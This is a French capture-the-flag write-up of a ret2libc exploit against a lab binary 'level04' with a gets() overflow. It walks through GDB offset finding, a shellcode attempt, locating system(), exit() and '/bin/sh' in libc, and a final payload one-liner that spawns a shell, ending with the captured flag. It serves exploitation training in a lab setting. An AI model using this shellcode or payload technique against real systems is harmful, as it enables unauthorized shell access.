# Exploit ret2libc - level04

## ✈️ But

Faire une attaque **ret2libc** sur le binaire `level04`, car l'exécution directe de shellcode est bloquée par `ptrace()`.

---

## 📆 Contexte

* Overflow sur `gets()`
* Taille du buffer: 0x80 = **128 octets**
* Padding trouvé à **156 octets**
* Utilisation de `system("/bin/sh")` via la libc

---

## 🔧 Analyse GDB (avec le process enfant)

### Mettre un breakpoint sur `gets()` dans l'enfant :

```gdb
set follow-fork-mode child
set detach-on-fork off
b *main+150
```

### Lancement de l'exploit (exemple d'overflow simple)

```bash
python2 -c 'print "A" * 150 + "B" * 4 +  "C" * 4 + "D" * 2'
```

Retour dans GDB :

```
Program received signal SIGSEGV, Segmentation fault.
0x44444343 in ?? ()
```

Interprétation : `\x44\x44\x43\x43` = `DDCC`

Donc : **ret = 156 octets** → **début de l'écrasement mémoire**

---

## 🧬 Tentative de shellcode direct

```bash
export SC=$(python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" + "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

Mais ce n'est pas exécuté → on passe à **ret2libc**.

---

## ⚖️ ret2libc: recherche des adresses

### 1. Trouver les fonctions avec GDB

```gdb
start
p system    → 0xf7e6aed0
p exit      → 0xf7e5eb70
```

### 2. Localiser la libc

```gdb
info proc mappings
```

Exemple :

```
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
```

### 3. Trouver l'offset de "/bin/sh"

```bash
strings -tx /lib32/libc-2.15.so | grep "/bin/sh"
```

Résultat :

```
15d7ec /bin/sh
```

### 4. Calculer l'adresse finale

```python
>>> hex(0xf7e2c000 + 0x15d7ec)
'0xf7f897ec'
```

---

## ⚔️ Payload final (en little endian)

* system()   = `0xf7e6aed0` → `\xd0\xae\xe6\xf7`
* exit()     = `0xf7e5eb70` → `\x70\xeb\xe5\xf7`
* "/bin/sh"  = `0xf7f897ec` → `\xec\x97\xf8\xf7`

### ⚡ Lancement final

```bash
(python2 -c 'print "A"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
```

---

## 🎯 Résultat

```bash
flag : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

---

## 🚀 Bonus : outils utilisés

* `gdb`
* `strings`
* `grep`
* `python2`
* connaissances de la stack + little endian + ASLR off

Bravo 💪🎉 ! Tu viens de faire un exploit propre avec `ret2libc` !
